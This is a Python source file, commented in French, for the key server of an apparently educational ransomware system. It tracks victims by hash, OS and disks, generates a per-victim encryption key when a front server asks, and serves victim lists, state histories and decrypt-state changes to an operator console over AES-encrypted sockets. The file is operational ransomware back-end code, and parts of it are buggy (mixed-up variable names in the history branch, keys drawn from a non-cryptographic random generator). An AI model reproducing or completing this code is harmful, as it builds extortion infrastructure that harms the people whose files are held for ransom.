from threading import Thread
import queue
import string
import random
import utile.network as network
import utile.message
import utile.data as data
import utile.security as security
import utile.config as config


# Constantes
AES_GCM = True
DEBUG_MODE = True
PORT_SERV_CONSOLE = 8380
PORT_SERV_FRONTAL = 8381

def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    return ''.join(random.choice(caracteres) for i in range(longueur))


def main():
    conn_db = data.connect_db()
    q_request = queue.Queue()   # Queue FIFO réceptionnant toutes les demandes vers la DB
    q_response_console = queue.Queue()  # Queue FIFO pour renvoyer les réponses vers la console de contrôle
    q_response_frontal = queue.Queue()  # Queue FIFO pour renvoyer les réponses vers le serveur frontal

    # Démarrage du Thread de communication avec la console de contrôle
    t_console = Thread(target=thread_console, args=(q_request, q_response_console,), daemon=True)
    t_console.start()

    # Démarrage du Thread de communication avec le serveur frontal
    t_frontal = Thread(target=thread_frontal, args=(q_request, q_response_frontal,), daemon=True)
    t_frontal.start()

    while True:
        # Réception des requests en FIFO
        msg = q_request.get()
        msg_type = utile.message.get_message_type(msg)

        # Si le message reçu est un list_victim_req
        if msg_type == 'LIST_VICTIM_REQ':
            victims = data.get_list_victims(conn_db)

            for victim in victims:
                # Envoi des messages list_victime_resp
                msg = utile.message.set_message('list_victim_resp', victim)
                # Envoi du msg sur la queue q_response_console
                if DEBUG_MODE:
                    print(f"Put msg {msg}")
                q_response_console.put(msg)
                q_response_console.join()

                # Envoi du message list_victime_end
            msg = utile.message.set_message('list_victim_end')
            # Envoi du msg sur la queue q_response_console
            if DEBUG_MODE:
                print(f"Put msg {msg}")
            q_response_console.put(msg)
            q_response_console.join()
            q_request.task_done()
        # Si le message reçu est un history_req
        elif msg_type == 'HISTORY_REQ':
            id_victim = msg['HIST_REQ']
            histories = data.get_list_history(conn_db, id_victim)
            for history in histories:
                # Envoi des messages history_resp
                msg = utile.message.set_message('history_resp', history)
                # Envoi du msg sur la queue q_response_console
                if DEBUG_MODE:
                    print(f"Put msg {msg}")
                q_response_console.put(msg)
                q_response_console.join()

            # Envoi du message history_end
            msg = utile.message.set_message('history_end', [id_victim])
            # Envoi du msg sur la queue q_response_console
            if DEBUG_MODE:
                print(f"Put msg {msg}")
            q_response_console.put(msg)
            q_response_console.join()
            q_request.task_done()
        # Si le message reçu est un change_state
        elif msg_type == 'CHANGE_STATE':
            id_victim = msg['CHGSTATE']
            # ==== FONCTION change_state_decrypt(id_victime) à produire ====
            data.change_state_decrypt(conn_db, id_victim)
            q_request.task_done()

        # Si le message reçu est un initalize_req
        elif msg_type == 'INITIALIZE_REQ':
            # Check si HASH existe déjà en DB
            victim = data.check_hash(conn_db, msg['INITIALIZE'])  # Retourne l'id_victim + key_victim + last_state
            if victim is None:
                key_victim = generate_key(512)
                # Enregistrement en DB de la nouvelle victime
                id_victim = data.new_victim(conn_db, msg['INITIALIZE'], msg['OS'], msg['DISKS'], key_victim)
                victim = [id_victim, key_victim, 'INITIALIZE']
            # Envoie du initialize_key
            msg = utile.message.set_message('initialize_key', victim)
            # Envoi du msg sur la queue q_response_console
            if DEBUG_MODE:
                print(f"Put msg {msg}")
            q_response_frontal.put(msg)
            q_response_frontal.join()


def thread_console(q_request, q_response_console):
    server_socket = network.start_net_serv(port=PORT_SERV_CONSOLE)

    # Boucle pour maintenir le serveur en écoute indéfiniment
    while True:
        # Accepter une nouvelle connexion
        s_console, client_address = server_socket.accept()
        print(f"Nouvelle connexion entrante de {client_address}")

        # Insérer le traitement des données ici
        while True:
            aes_key = security.gen_key()
            print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")
            network.send_message(s_console, aes_key)
            # Recevoir le message du client
            message = network.receive_message(s_console)
            print(message)
            message = security.aes_decrypt(message, aes_key)
            print("Message décrypté" + str(message))
            msg_type = utile.message.get_message_type(message)
            # Afficher le message reçu
            print(f"Message du client : {message}")
            print(f"Type : {msg_type}")
            # Si le message reçu est un list_victim_req
            if msg_type == 'LIST_VICTIM_REQ':
                q_request.put(message)      # Envoie la requête dans la queue q_request
                message = q_response_console.get()
                if DEBUG_MODE:
                    print(f"Get msg {message}")
                msg_type = utile.message.get_message_type(message)
                while msg_type != 'LIST_VICTIM_END':       # Envoie la liste des victimes
                    message = security.aes_encrypt(message, aes_key)
                    network.send_message(s_console, message)
                    q_response_console.task_done()
                    message = q_response_console.get()
                    print(f"Get msg {message}")
                    msg_type = utile.message.get_message_type(message)
                # Envoi du message list_victime_end
                message = security.aes_encrypt(message, aes_key)
                network.send_message(s_console, message)
                q_response_console.task_done()
            # Si le message reçu est un history_req
            elif msg_type == 'HISTORY_REQ':
                q_request.put(msg)  # Envoie la requête dans la queue q_request

                msg = q_response_console.get()
                if DEBUG_MODE:
                    print(f"Get msg {msg}")
                msg_type = message.get_message_type(msg)
                while msg_type != 'HISTORY_END':  # Envoie les historiques d'états
                    # Envoi des messages history_resp
                    if AES_GCM:
                        msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(s_console, msg)
                    q_response_console.task_done()
                    msg = q_response_console.get()
                    if DEBUG_MODE:
                        print(f"Get msg {msg}")
                    msg_type = message.get_message_type(msg)
                # Envoi du message history_end
                if AES_GCM:
                    msg = security.aes_encrypt(msg, aes_key)
                network.send_message(s_console, msg)
                q_response_console.task_done()
            # Si le message reçu est un change_state
            elif msg_type == 'CHANGE_STATE':
                q_request.put(msg)  # Envoie la requête dans la queue q_request


def thread_frontal(q_request, q_response_frontal):
    aes_key = b''
    s_serveur = network.start_net_serv(port=PORT_SERV_FRONTAL)

    while True:
        print(f"[Serveur de clés] : en écoute sur {PORT_SERV_FRONTAL}.")
        s_frontal, address_frontal = s_serveur.accept()
        print(f"[Serveur de clés] : Connexion du serveur frontal {address_frontal} a été établie.")

        # Envoi la clé de chiffrement lors de la connexion via Diffie Hellman Send Key

        aes_key = security.diffie_hellman_send_key(s_frontal)
        print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")

        # Envoi la clé de chiffrement lors de la connexion sans sécurisation des échanges
        #if AES_GCM:
        #    aes_key = security.gen_key()
        #    if DEBUG_MODE:
        #        print(f"Clé de chiffrement : {aes_key} {type(aes_key)}")
        #    network.send_message(s_console, aes_key)
        while True:
            # Réception du premier message
            msg = network.receive_message(s_frontal)
            if not msg:     # La connexion a été fermée
                break
            if AES_GCM:
                msg = security.aes_decrypt(msg, aes_key)
            msg_type = utile.message.get_message_type(msg)
            # Si le message reçu est un initialize_req
            if msg_type == 'INITIALIZE_REQ':
                q_request.put(msg)      # Envoie la requête dans la queue q_request
                msg = q_response_frontal.get()
                if DEBUG_MODE:
                    print(f"Get msg {msg}")
                msg_type = utile.message.get_message_type(msg)
                if msg_type == 'INITIALIZE_KEY':       # Envoie de la clé de chiffrement
                    if AES_GCM:
                        msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(s_frontal, msg)
                    q_response_frontal.task_done()


if __name__ == '__main__':
    main()
